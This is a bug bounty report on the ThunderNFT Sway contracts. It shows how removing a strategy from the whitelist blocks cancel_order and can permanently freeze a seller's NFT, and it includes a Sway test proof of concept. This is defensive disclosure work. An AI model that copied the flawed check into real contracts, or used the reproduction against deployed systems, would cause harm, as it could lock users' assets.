# IOP \_ ThunderNFT 34585 - \[Smart Contract - High] Permanent freezing of NFTS that seller deposit into

Submitted on Fri Aug 16 2024 15:11:08 GMT-0400 (Atlantic Standard Time) by @zeroK for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34585

Report type: Smart Contract

Report severity: High

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/thunder\\_exchange>

Impacts:

* Permanent freezing of NFTs

## Description

## Brief/Intro

the cancle\_function in thunderNFT\_exchange allow users with active orders to cancel their orders, the most important thing is that the cancle\_order allow seller to cancel and take back their NFT, however this is not always the case when the strategy whitelist address get updated for any reason(new strategy supporting or previous one have an issue) since there is a check that prevent using previous strategies that removed from whitelist, this way the seller NFT will be stuck forever and since the execute\_order depends on the strategy the NFT itself can not be purchased or accepting any offers.

NOTE: this report is combine of report id 34567 which prevent updating the payment asset too, this way user can not update the strategy because the update\_order revert too.

## Vulnerability Details

when seller want to cancel its order the function below should get called which transfer the NFT back to the owner:

```sway

    /// Cancels MakerOrder
    #[storage(read)]
    fn cancel_order(
        strategy: ContractId,
        nonce: u64,
        side: Side
    ) {
        let caller = get_msg_sender_address_or_panic();

        let execution_manager_addr = storage.execution_manager.read().unwrap().bits();
        let execution_manager = abi(ExecutionManager, execution_manager_addr);

        require(strategy != ZERO_CONTRACT_ID, ThunderExchangeErrors::StrategyMustBeNonZeroContract);
        require(execution_manager.is_strategy_whitelisted(strategy), ThunderExchangeErrors::StrategyNotWhitelisted); //@audit 

        let strategy_caller = abi(ExecutionStrategy, strategy.bits()); 
        let order = strategy_caller.get_maker_order_of_user(caller, nonce, side); // get the order for the caller

        match side {
            Side::Buy => {
                // Cancels buy MakerOrder (e.g. offer)
                strategy_caller.cancel_order(caller, nonce, side);
            },
            Side::Sell => {
                // Cancel sell MakerOrder (e.g. listing)
                if (order.is_some()) {
                    // If order is valid, then transfers the asset back to the user
                    let unwrapped_order = order.unwrap();
                    strategy_caller.cancel_order(caller, nonce, side);
                    transfer(
                        Identity::Address(unwrapped_order.maker),
                        AssetId::new(unwrapped_order.collection, unwrapped_order.token_id),
                        unwrapped_order.amount
                    );
                }
            },
        }

        log(OrderCanceled {
            user: caller,
            strategy,
            side,
            nonce,
        });
    }

```

if the strategy address got updated, then its impossible to user to transfer back their NFTs, the codebase itself not seem like its upgradable because of missing the upgradability requirement which mean even if the seller set the whitelisted strategy this won't allow him to get back his NFT since the seller have no valid order in the new strategy address.

combining this with the report id 34567, the seller will never be able to cancel or execute his order and updating the sell order won't sent back the NFT.

## Impact Details

Permanent freezing of NFT can occur when new strategy listed as whitelist, this is possible when the payment asset removed from whitelist which prevent calling update\_order and when the strategy removed from whitelist which prevent calling cancel or execute order.

## References

checking for the strategy whitelist is not very important for canceling orders since the protocol allow deposit and create order only when the strategy is whitelisted.

we prefer setting the contract to upgradable since this way the data will be copied to the new implemented strategy.

## Proof of concept

## Proof of Concept

tIMPORTANT: he notes from report id 34567 should be taken in mind before running this POC

```sway

contract;

// please take the mentioned note in reportID: 34567  in mind since some lines in the codebase should be commented

 use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
    royalty_manager_interface::*,
    asset_manager_interface::*,
    execution_manager_interface::ExecutionManager,
    execution_strategy_interface::*,
    pool_interface::Pool,
};

use libraries::{
    msg_sender_address::*,
    constants::*,
    order_types::*,
    ownable::*,
};

use std::{
    block::timestamp,
    auth::*,
    call_frames::*,
    context::*,
    contract_id::ContractId,
    logging::log,
    revert::require,
    storage::storage_map::*,
    asset::*,
};
 
#[test(should_revert)]
fn test_attack() {
    initialize_functions();


}

fn initialize_functions() {

    //initialize all contracts 

    let thunder_exch = abi(ThunderExchange, thunder_exchange::CONTRACT_ID);
    thunder_exch.initialize();

    let asset_mngr = abi(AssetManager, asset_manager::CONTRACT_ID);
    asset_mngr.initialize();

    // required for initialize below contracts
    let exchange_contract_id = ContractId::from(thunder_exchange::CONTRACT_ID);

    let asset_manger_contract_id = ContractId::from(asset_manager::CONTRACT_ID);

    let fixed_strategy = abi(ExecutionStrategy, strategy_fixed_price_sale::CONTRACT_ID);
    fixed_strategy.initialize(exchange_contract_id);

    let execution_manager = abi(ExecutionManager, execution_manager::CONTRACT_ID);
    execution_manager.initialize();

    let royalty_manager = abi(RoyaltyManager, royalty_manager::CONTRACT_ID);
    royalty_manager.initialize();

    //get contract IDs 

    let execution_manger_contract = ContractId::from(execution_manager::CONTRACT_ID);
    let royalty_manger_contract = ContractId::from(royalty_manager::CONTRACT_ID);
    let pool_contract = ContractId::from(pool::CONTRACT_ID);
    let stratgey_fixed = ContractId::from(strategy_fixed_price_sale::CONTRACT_ID);


    let asset_to_add = AssetId::base();
    
    asset_mngr.add_asset(asset_to_add);


    let asset_id = AssetId::bits(asset_to_add);


    let pool = abi(Pool, pool::CONTRACT_ID);
    pool.initialize(exchange_contract_id, asset_manger_contract_id);

    let caller = Address::from(0xf8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07);

    //set functions

    execution_manager.add_strategy(stratgey_fixed);

    thunder_exch.set_asset_manager(asset_manger_contract_id);
    thunder_exch.set_pool(pool_contract);
    thunder_exch.set_execution_manager(execution_manger_contract);
    // thunder_exch.set_protocol_fee_recipient(Identity::Address::from(0xf9b8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07)); // diff from maker
    thunder_exch.set_royalty_manager(royalty_manger_contract);

    //----------------------execute attack --------------------------------//

    let caller = Address::from(0xf9b8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07);

    let extra_parameter = ExtraParams {
        extra_address_param: Address::zero(),
        extra_contract_param: ContractId::zero(),
        extra_u64_param: 0u64
    };

    let maker_order = MakerOrderInput {
     side: Side::Sell,
     maker:caller,
     collection: ContractId::from(0x7777777777777777777777777777777777777777777777777777777777777777),
     token_id: SubId::from(0x7777777777777777777777777777777777777777777777777777777777777778),
     price: 10u64,
     amount: 1u64,
     nonce: 1u64,
     strategy:stratgey_fixed,
     payment_asset: asset_to_add,
     expiration_range: 1000u64,
     extra_params: extra_parameter,
    };


    thunder_exch.place_order(maker_order); // this could be called as .call {gas: 5000, asset_id : NFT_id, coins: 1 } but since this not possible in sway test then you need to comment the require check in the place_order--> order.sell

    execution_manager.remove_strategy(0);
    //no need to simulate adding another strategy since the seller is forced to use the old strategy since it contains the storage data.

    thunder_exch.cancel_order(stratgey_fixed, 1u64, Side::Sell);
}
```
